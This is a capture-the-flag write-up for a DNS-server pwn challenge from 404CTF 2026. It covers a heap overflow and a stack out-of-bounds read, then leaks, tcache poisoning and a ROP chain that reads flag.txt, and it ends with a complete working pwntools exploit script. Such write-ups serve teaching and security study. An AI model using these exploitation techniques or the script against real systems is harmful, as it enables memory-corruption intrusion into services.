Travaux de Gallois

The Challenge

[*] '/home/kali/Documents/CTF/404CTF/404CTF2026/pwn/gallois/chall'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found

    RUNPATH:    b'./'
    Stripped:   No

The challenge essentially implements a custom dns server which always responds with the same hardcoded address.

The network interaction with the remote instance is made through UDP packets following the usual form of dns packets.

Analysis

The important structures used in the packet transmission are the following :

// Represents a DNS message (containing questiosn and answers)
// Embedded in a Packet structure
struct DNSMessage {
    unsigned char identification[2];
    struct DNSQueryFlags* flags;
    struct DNSQuery* queries; // references the queries
    struct DNSAnswer* answers;
    unsigned short number_of_questions;
    unsigned short number_of_answers;
    unsigned short number_of_authoritatives;
    unsigned short number_of_additional;   
};

// Represents a query asking for one or more domains to resolve
struct DNSQuery {
    struct DNSQuery* next; //for chaining
    struct DomainPart* parts; //references the domains to resolve
    int len;
    unsigned short type;
    unsigned short class;
};

// Represents a domain to resolve
struct DomainPart {
    struct DomainPart* next; // for chaining
    int len;
    char* part; //actual string containing the domain name
};

As you may have noticed these structures have next pointers. This is because a Message can contain multiple queries that are linked to gether in a linked list and each query can also have multiple domains to resolve which are also stored in a linked list.

The general workflow is :

  • Listen and receive incomming message

  • Parse the request message (and thus allocate all the necessary structures)

  • Create an answer for each domain (resolving to the hardcoded address)

  • Craft a dns packet (including the questions and domains sent in the query) and send it

  • Free every structure

Analysing the parsing code gives us an idea on how we should build valid packets. Here is the form of a packet containing multiple queries, each containing multiple domains :

The vuln

The main vulenrability lies in the parsing of incoming packets.

Here is the first vulenrability :

// dns.c
unsigned char* queries = packet + 12;
// for (int i = 0; i < result->number_of_questions; i++) { ...
domain_part->len = *queries;
// ...
char* part = malloc(strlen(queries)); // allocated one less byte than required
// it's possible to have strlen(queries) < domain_part->len
domain_part->part = part;
memcpy(domain_part->part, queries, domain_part->len);
domain_part->part[domain_part->len] = '\0'; // OOB nullbyte write if strlen(queries) < domain_part->len
queries += domain_part->len; // queries is on the stack

queries and domain_part->len come from the packet so it’s chosen by the user. Then *queries (first byte of the domain part) which is supposedly the length of the domain could actually be different from the actual size returned by strlen(queries) if the domain part contains a null byte. Since memcpy relies on the user provided size to copy memory even though a smaller buffer have been allocated by malloc, this can result in heap overflow.

There is also a second vulnerability :

Since queries is a pointer on the stack, pointing to the stack:

// packet is 1024 bytes buffer on the stack 
// See unsigned char request[1024]; in main.c
unsigned char* queries = packet + 12; 
// ...
queries += domain_part->len; // domain_part->len = *queries;

Here if domain_part->len which is set with the controlled value *queries is greater than the actual size of request then it accesses values on the stack after the packet buffer.

Exploitation

TLDR

  • Leak stack and libc address from the stack after the request buffer

  • Leak address of the heap using heap overflow and chunk arrangement

  • Poison tcache to force malloc to return a stack address

  • Overwrite return address on the stack with a rop chain

Detailed exploitation and issues

In my exploit I used at multiple times heap chunk arrangement. Basically triggering calls to malloc with different sizes in a special order to make so the heap memory layout is ready for exploitation. To find such arrangement I basically try, look at the heap with pwndbg (bins and vis -a are very usefull commands) and draw the memory layout with a paper and a pen. I won’t get too much in the details because it’s very hard and messy to explain but the important thing to remember is that most structures result in an allocation of size 0x20 except for the Message struct wich is of size 0x30 and every domain string results in an arbitrary allocation size.

Stack and libc leak

The easiest way I found to leak stack and libc address at the same time is leaking the content of the stack right after the request buffer present in the stack frame of main

Leveraging this vulnerability :

domain_part->len = *queries;
//...
memcpy(domain_part->part, queries, domain_part->len);

We can manipulate queries (which is a pointer into the request buffer) in a way that queries + domain_part->len points outside the buffer and so a part of the memory copied by memcpy is from the stack (values just after the request buffer).

The main difficulties :

  • Since the size is contained in one byte we can only increment by 255 for each domain part. So we’ll have to do it multiple times because the buffer is 1024 bytes long.

  • If we just put a huge size for the domain but the actual size allocated by malloc(strlen(queries)) is smaller, the memcpy will overwrite next chunks’s metadata in the heap and cause a crash.

Let’s visualize it to make it clearer.

Here is how I crafted my payload :

To mitigate the second issue I made so two chunks for domain string buffer are allocated next to each other so the memcpy overflows from one into the second and I just have to place the chunk size at the right offset to keep the heap in a stable state (see packet schema). At the same time this puts the data we want to leak in a buffer which will be sent back in the response packet.

With this method I leaked stack, libc and programm addresses along with the stack canary.

Heap leak

To leak a heap address I used another heap arrangement trick to force a domain string buffer (called Y) to be allocated juste before it’s corresponding DomainPart struct, allowing me to overflow it and change its len filed with a slightley bigger value so when the answer is crafted it reads memory addresses on the heap past the buffer size. Since the DomainPart struct will be freed, its fd field will contain an address from the heap and this address will be leaked when memory from Y will be read past its real size.

(Notice the “flag.txt”” string inserted in the Y buffer, its not important for now but it will be useful later…)

Tcache poisonning

Now we have all the information needed to perform tcache poisonning (we needed the heap address to bypass tcache pointer mangling).

The idea is to perform yet another heap overflow to overwrite a freed chunk metadatas. I had to make sure I poison a bin size containing more than 1 free chunk and make sure I don’t put it at the end. So I had to do again some heap arrangement to be able to overflow the right chunks. In my case I chose to poison tcache size 0xb0 (actually a bad choice but we’ll see why later).

This way, the econd next call to malloc(0xb0) will return a stack address that i could use to overwrite return address.

Notice that I can choose any addresse I want for any furture writes since I leaked stack, libc, programm and heap. ASLR and PIE are completely beaten at this point.

ROP chain

Here the problems started. I realized that in order for malloc to return my poisonned chunk I had to make sure the buffer started with a string of length 0xb0. I could not just return the address of return address and write my ROP chain because it would contain many null bytes that would make malloc return another size of chunk. So I had to put a long string before my ROP chain and write it a few bytes before the actual return address so the part with the rop chain would land at the right location. But this caused another problem : it overwrites data on the stack that the applciation still uses (the stack canary for example) resulting in a crash.

The easy solution would have been to poison a bin of size 0x20. Since it’s the smallest size it would have been returned by malloc anyway, avoiding all these problems.

But since I really didn’t have the courage to start all over again, finding new heap arrangements to make that happen, I found another trick…

I used all the information I’ve got from the leaks to write back every address my payload would overwrite so the stack stays in a stable state. This feels not clean at all and very messy but I think it’s interesting to show that sometimes even tough we make mistakes it’s still possible to find workarounds !

Code execution

At this point I could achieve code execution thanks to my ROP chain. But the challenge is not over. Indeed it’s not like I can just execute system("/bin/sh") or execute a reverse shell because I don’t have direct access to the machine and it does not have access to the internet.

At first I thouhgt about executing system("./chall $(cat flag.txt)") because the challenge returns command line argument as the resolved address but it didn’t work. I assumed it was because the binary was probably not named this way and thought I was on the wrong track. Later I talked with the challenge creator and he told me this was one of the intended solve and that I just forgot to close the socket before launching the command😭. This would have been the easy ending…

But once again I took another (harder) path :

I assumed that using the already established socket was the only way to exfiltrate information. Thus I crafted my ROP chain to :

  1. open the flag file (using a pointer to the buffer where we placed “flag.txt” earlier)

  2. read it’s content into a buffer in the heap

  3. call sendto with the right arguments to reuse the socket and address structures and the buffer containing the flag.

The last obstacle I encountered was that my ROP chain was too long and eventually overwrote the socket and the address structures making them unusable.

So I used a pop rbp; leave; ret; gadget to pivot on the stack and jump somewhere else, leaving everything clean.

Final script

#!/usr/bin/env python3

from pwn import *
import socket

exe = ELF("chall_patched")
libc = ELF("libc.so.6")
ld = ELF("ld-linux-x86-64.so.2")

context.binary = exe

context.log_level = "error"



def conn():
    if not args.REMOTE:
        return "127.0.0.1", 4000
    else:
        return "162.19.117.18", 32375


class DnsFlags:
    def __init__(self, qr=1, opcode=1, aa=1, tc=1, rd=1, ra=1, rcode=1):
        self.qr = qr & 0x1
        self.opcode = opcode & 0xf
        self.aa = aa & 0x1
        self.tc = tc & 0x1
        self.rd = rd & 0x1
        self.ra = ra & 0x1
        self.rcode = rcode & 0xf

    def pack(self):
        flag = (self.qr << 15) | (self.opcode << 11) | (self.aa << 10) | (self.tc << 9) | (self.rd << 8) | (self.ra << 7) | self.rcode 
        return flag.to_bytes(2)

    def __str__(self):
        return (f"DnsFlags(qr={self.qr}, opcode={self.opcode}, aa={self.aa},"f"tc={self.tc}, rd={self.rd}, ra={self.ra}, rcode={self.rcode})")


class Query:
    def __init__(self, domains, lens = None, clas=1, typ=1, raw=False):
        self.domains = domains
        if lens is None:
            self.lens = [min(len(d)+1, 255) for d in domains]
        else:
            self.lens = lens
        self.clas = clas
        self.typ = typ
        self.raw = raw

    def pack(self):
        if self.raw:
            return self.domains[0]

        b = b""
        for d,l in zip(self.domains, self.lens):
            b += l.to_bytes(1)
            b += d + b"\x00" 
        b += b"\x00"
        b += self.clas.to_bytes(2)
        b += self.typ.to_bytes(2)
        b += b"\x00"
        return b

    def __str__(self):
        domain_str = str(self.domains)
        return (
            f"Query(domains='{domain_str}', length={self.lens}, "
            f"class={self.clas}, type={self.typ})")

class Packet:
    def __init__(self, queries, ident = 1337, dnsflags = DnsFlags(), nquest = -1, nans = 0, nauth = 1, nadd = 1):
        self.ident = ident
        self.dnsflags = dnsflags
        self.nquest = nquest if nquest != -1 else len(queries)
        self.nans = nans
        self.nauth = nauth
        self.nadd = nadd
        self.queries = queries

    def pack(self):
        b = self.ident.to_bytes(2) 
        b += self.dnsflags.pack() 
        b += self.nquest.to_bytes(2) 
        b += self.nans.to_bytes(2) 
        b += self.nauth.to_bytes(2) 
        b += self.nadd.to_bytes(2) 
        for q in self.queries:
            b += q.pack() 
        return b

    def raw_resp(data):
        offset = 12
        nquest = int.from_bytes(data[4:6], "big")

        for _ in range(nquest):
            length = data[offset]
            offset += 1
            offset += length + 1
            offset += 2
            offset += 2

        raw_ans = data[offset:]
        return raw_ans

    def unpack(data):
        ident = int.from_bytes(data[0:2], "big")
        flags = int.from_bytes(data[2:4], "big")
        nquest = int.from_bytes(data[4:6], "big")
        nans = int.from_bytes(data[6:8], "big")
        nauth = int.from_bytes(data[8:10], "big")
        nadd = int.from_bytes(data[10:12], "big")

        offset = 12
        queries = []

        for _ in range(nquest):
            length = data[offset]
            offset += 1
            domain = data[offset:offset+length]
            offset += length + 1
            clas = int.from_bytes(data[offset:offset+2], "big")
            offset += 2
            typ = int.from_bytes(data[offset:offset+2], "big")
            offset += 2
            queries.append(Query(domain, length, clas, typ))

        raw_ans = data[offset:]
        return Packet(queries, ident, DnsFlags(), nquest, nans, nauth, nadd)

    def __str__(self):
        queries_str = "\n  ".join(str(q) for q in self.queries)
        return (
            f"Packet(\n"
            f"  ident={self.ident},\n"
            f"  flags={self.dnsflags},\n"
            f"  nquest={self.nquest}, nans={self.nans}, "
            f"nauth={self.nauth}, nadd={self.nadd},\n"
            f"  queries=[\n  {queries_str}\n  ]\n"
            f")"
        )


def send_and_recv(packet):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    sock.bind(("0.0.0.0", 0))

    message = packet.pack()

    address, port = conn()
    sock.sendto(message, (address, port))

    print(f"Packet sent: {message} (len = {len(message)})")

    try:
        data, addr = sock.recvfrom(4096)
        print(f"Response from {addr}: {data}")

        return data

    except socket.timeout:
        print("No response received")
        return None

    finally:
        sock.close()


def main():

    ysize = 0x32

    # part 1 leak stack + libc

    # pass 1

    q = Query([b"a"*0x12]) 

    p = Packet(queries = [q])
    data = send_and_recv(p)
    #print(Packet.unpack(data))

    # pass 2

    x = 0xa2 * b"x"
    y = ysize * b"y"

    q1 = Query([]) 
    q2 = Query([x, y])

    p = Packet(queries = [q1, q2])
    data = send_and_recv(p)
    #print(Packet.unpack(data))

    # pass 3

    pld = (int(254).to_bytes(1) + b"b"*253 + b"\x00")*3 + int(167).to_bytes(1) + b"c"*166 + b"\x00" + int(206).to_bytes(1) + 0x36 * b"e" + b"\x00"*2 + b"\xb1" + b"\x00"*7 + b"f"*14

    q = Query([pld])
    p = Packet(queries = [q])
    data = send_and_recv(p)
    data_leak = Packet.raw_resp(data).split(b"\x00")
    print(data_leak)
    cookie = (u64(data_leak[11].ljust(8, b"\x00")) << 8) & 0xffffffffffffffff
    libc_leak = u64(data_leak[18].ljust(8, b"\x00"))
    stack_leak = u64(data_leak[20].ljust(8, b"\x00"))
    prog_leak = u64(data_leak[22].ljust(8, b"\x00"))

    print(f"stack cookie : {hex(cookie)}")
    print(f"libc leak : {hex(libc_leak)}")
    libc.address = libc_leak - 0x29ca8
    print(f"libc base : {hex(libc.address)}")
    print(f"stack leak : {hex(stack_leak)}")
    print(f"prog leak : {hex(prog_leak)}")
    exe.address = prog_leak - 0x220b
    print(f"prog base : {hex(exe.address)}")


    # part 2 leak heap

    # pass 1

    # place the filename in this chunk for later use in open
    z = (0x42-13)*b"z" + b"flag.txt\x00" 
    w = 0x62*b"w"
    h1 = (ysize)*b"h" 
    h = ysize*b"h"

    q1 = Query([])
    q2 = Query([z, w, h1, h])

    p = Packet(queries = [q1, q1, q1, q1, q1, q2])
    data = send_and_recv(p)
    print(Packet.unpack(data))

    # pass 2

    pld = b"e"*0x16 + b"\x00"*2 + b"\x21" + b"\x00"*(7+8) + b"\x36"
    q1 = Query([pld])

    p = Packet(queries = [q1])
    data = send_and_recv(p)
    data_leak = data.split(b"\x00")
    heap_leak = u64(data_leak[-7].ljust(8, b"\x00"))
    print(f"heap leak : {hex(heap_leak)}")


    # part 3 tcache poisoning

    target = stack_leak - 0x610 # stack address few addresses behind return address
    print(f"target stack write : {hex(target)}")
    mangled_target = (heap_leak >> 12) ^ target # mangle to poison tcache

    replace = (heap_leak & 0xfffffffffffff000) | 0x2f0
    mangled_replace = (heap_leak >> 12) ^ replace

    pld = b"f"*0x16 + b"\x00"*2 + b"\x21" + b"\x00"*7 + p64(mangled_replace) + b"\x00"*16 + b"\xb1" + b"\x00"*7 + p64(mangled_target)[:6]
    qe = Query([])
    q1 = Query([pld])

    p = Packet(queries = [qe, qe, qe, qe, qe, q1])
    data = send_and_recv(p)
    print(data)

    # part 4 overwrite stack

    q1 = Query([y])

    # gadgets
    poprdi = libc.address + 0x000000000002a145
    filename = (heap_leak & 0xfffffffffffff000) | (0x855)
    ret = libc.address + 0x000000000002846b
    poprsi = libc.address + 0x000000000002baa9
    poprdxrbx = libc.address + 0x000000000008f0c5
    xchg = libc.address + 0x0000000000178ee1 #xchg rdi, rax
    poprdxrcxrbx = libc.address + 0x00000000000e3c8d
    poprax = libc.address + 0x0000000000043c43
    poprbp = libc.address + 0x000000000002a05a
    leave = libc.address + 0x0000000000054c47 

    buffer = filename

    # pivot to avoid overwritting socketstruct
    pivotadd = stack_leak - 0x3e1 - 0x30
    rop1 = p64(poprbp) + p64(pivotadd) + p64(leave) 

    #rop chain to open flag file, read it into buffer and call sendto
    rop = p64(ret) + p64(poprdi) + p64(filename) + p64(poprsi) + p64(0) + p64(poprdxrbx) + p64(0) + p64(0) + p64(libc.symbols["open"])

    read = libc.address + 0x103e90

    rop += p64(xchg) + p64(poprsi) + p64(buffer) + p64(poprdxrbx) + p64(60) + p64(0) + p64(read)


    sockfd = stack_leak - 0x100
    dest_add = stack_leak - 0x520
    sendto = exe.address + 0x2441 

    rop += p64(ret) + p64(poprsi) + p64(buffer) + p64(poprdxrcxrbx) + p64(60) + p64(dest_add) + p64(0) + p64(poprbp) + p64(sockfd) + p64(ret) + p64(sendto)


    # rewrite the overwritten stack layout to keep the programm stable
    heap_base = (heap_leak & 0xfffffffffffff000) 
    a1 = p64(stack_leak + 0x18)
    a2 = p64(stack_leak - 0x570)
    a3 = p64(0)
    a4 = p64(exe.address + 0x187f) 
    a5 = p64(heap_base | 0x2a0)
    a6 = p64(stack_leak - 0x510)
    a7 = b"J"*8
    a8 = p64(stack_leak - 0x477)
    a9 = b"\x2d" + b"\x00"*7
    a10 = p64(heap_base | 0x310)
    a11 = p64(heap_base | 0x800)
    a12 = p64(heap_base | 0x870)
    a13 = p64(stack_leak - 0x570)
    a14 = p64(cookie)
    a15 = b"J"*8


    # Change size of packet to 192 so it does not overwrite the socket 
    # This way it only copies until rop1 and we jump into rop with the pivot gadget
    pld = int(192).to_bytes(1) + b"e" * 0x30 + a1 + a2 + a3 + a4 + a5 + a6 + a7 + a8 + a9 + a10 + a11 + a12 + a13 + a14 + a15 + rop1 + rop

    q2 = Query([pld], raw=True)

    p = Packet(queries = [q1, q2])
    data = send_and_recv(p)
    print(Packet.raw_resp(data))
